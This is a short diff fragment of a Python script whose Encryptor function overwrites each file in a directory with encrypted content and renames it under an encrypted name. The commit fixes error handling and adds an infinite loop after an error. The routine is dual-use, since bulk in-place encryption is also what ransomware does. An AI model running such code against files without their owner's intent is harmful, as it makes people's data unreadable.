@@ -71,10 +71,15 @@ def Encryptor():
                                         openFile.write(encrypted)
                             
                             os.rename(dir_path + "/" + file, dir_path + "/" + encrypt(file, pwhash, config['iv']))
-                        else: raise("Could not read content of file.")
+                        else: raise Exception("Could not read content of file.")
                     except Exception as ex:
                         print("Could not encrypt %s" % file)
                         print(ex)
 
 if __name__ == "__main__":
-    Encryptor()
+    try:
+        Encryptor()
+    except Exception as ex:
+        print("An error occured:")
+        print(ex)
+        while True: pass
